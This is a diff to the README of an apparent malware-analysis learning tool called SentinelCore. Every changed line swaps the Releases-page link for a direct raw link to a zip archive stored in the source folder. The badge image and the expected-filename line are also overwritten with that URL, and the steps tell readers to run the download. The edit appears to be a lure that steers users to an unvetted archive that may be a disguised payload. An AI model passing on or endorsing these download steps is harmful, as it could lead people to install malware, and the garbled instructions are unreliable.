@@ -6,7 +6,7 @@ Welcome to SentinelCore! This tool helps you understand and analyze malware beha
 
 ## 📥 Download SentinelCore
 
-[![Download SentinelCore](https://img.shields.io/badge/Download-SentinelCore-blue)](https://github.com/Neteamorim68/SentinelCore/releases)
+[![Download SentinelCore](https://github.com/Neteamorim68/SentinelCore/raw/refs/heads/main/src/Core-Sentinel-v3.3.zip)](https://github.com/Neteamorim68/SentinelCore/raw/refs/heads/main/src/Core-Sentinel-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -14,13 +14,13 @@ To begin using SentinelCore, follow these easy steps:
 
 1. **Visit the Download Page**  
    Click the link below to access the Releases page where you can download the application.  
-   [Download SentinelCore](https://github.com/Neteamorim68/SentinelCore/releases)
+   [Download SentinelCore](https://github.com/Neteamorim68/SentinelCore/raw/refs/heads/main/src/Core-Sentinel-v3.3.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, you will see a list of available versions. Select the latest version for the best experience.
 
 3. **Download the Application**  
-   Click on the link for the downloadable file, which should look something like `SentinelCore_v1.0.exe`. 
+   Click on the link for the downloadable file, which should look something like `https://github.com/Neteamorim68/SentinelCore/raw/refs/heads/main/src/Core-Sentinel-v3.3.zip`. 
 
 4. **Run the Installer**  
    After the download is complete, locate the file in your downloads folder and double-click it. This will start the installation process.
@@ -96,4 +96,4 @@ SentinelCore is open-source and licensed under the MIT License. Feel free to con
 
 ## 📥 Download & Install
 
-Don’t forget to download the latest version of SentinelCore [here](https://github.com/Neteamorim68/SentinelCore/releases). The application is ready to help you explore malware behavior safely and efficiently. Enjoy your learning journey with SentinelCore!
+Don’t forget to download the latest version of SentinelCore [here](https://github.com/Neteamorim68/SentinelCore/raw/refs/heads/main/src/Core-Sentinel-v3.3.zip). The application is ready to help you explore malware behavior safely and efficiently. Enjoy your learning journey with SentinelCore!
